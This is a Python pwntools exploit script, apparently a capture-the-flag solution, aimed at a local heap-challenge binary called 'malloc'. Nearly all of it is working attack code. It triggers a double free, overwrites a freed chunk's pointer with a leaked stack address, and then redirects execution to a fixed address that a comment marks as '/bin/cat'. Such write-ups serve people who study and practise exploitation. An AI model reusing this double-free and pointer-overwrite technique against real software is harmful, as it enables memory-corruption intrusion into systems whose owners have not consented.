from pwn import *

print("-------------------")
print("------malloc-------")
print("--pwned by pwnWiz--")
print("-------------------")
print("\n")


context.log_level='debug'

binary='./malloc'
s=process('./malloc')
e=ELF(binary)

log.info("malloc Loaded..")

shellcode=0x400986 #/bin/cat


def malloc():
	for i in range(2):
		log.info("1.malloc Loaded..")
		s.sendline("1")
		print s.recvuntil(":")
		s.sendline("32")
		log.info("32\n")
		print s.recvuntil(":")
		s.sendline("A")
		log.info("A\n")
		print s.recv(1024)
		print s.recv(1024)

def free():
		log.info("2.free Loaded..")
		s.sendline("2")
		print s.recvuntil(":")
		s.sendline("2")
		log.info("2\n")
		print s.recv(1024)
		print s.recv(1024)
		log.info("2.list again Loaded for double free..")
		s.sendline("2")
		print s.recvuntil(":")
		s.sendline("1")
		log.info("1\n")
		print s.recv(1024)
		print s.recv(1024)
		
def list():
	log.info("3.list Loaded..")
	s.sendline("3")
	print s.recvuntil(":")

def modify():
	log.info("4.modify Loaded..")
	s.sendline("4")
	print s.recvuntil(":")
	s.sendline("1")
	log.info("1\n")
	print s.recvuntil(":")
	s.sendline(p64(stack-0x58))
	
def exit():
	log.info("5.exit Loaded..")
	s.sendline("5")

def exp():
	log.info("1.malloc Loaded to exploit :<")
	s.sendline("1")
	print s.recvuntil(":")
	s.sendline("32")
	log.info("32\n")
	print s.recvuntil(":")
	s.sendline("A"*32)
	log.info("A*32")
	s.recv(1024)
	s.recv(1024)
	log.info("1.malloc Loaded to exploit :<")
	s.sendline("1")
	print s.recvuntil(":")
	s.sendline("49")
	log.info("49\n")
	print s.recvuntil(":")
	s.sendline("A"*24+p64(shellcode))

s.recvuntil(":")
stack=int(s.recvuntil("\n"),16)
#print("stack address : "+ stack)
print s.recv(1024)
sleep(1)
malloc() # allocate 1st, 2nd memory chunk with size 32
free()  # free 2nd, 1st
modify() # stack-0x58 insert
exp()
s.interactive()

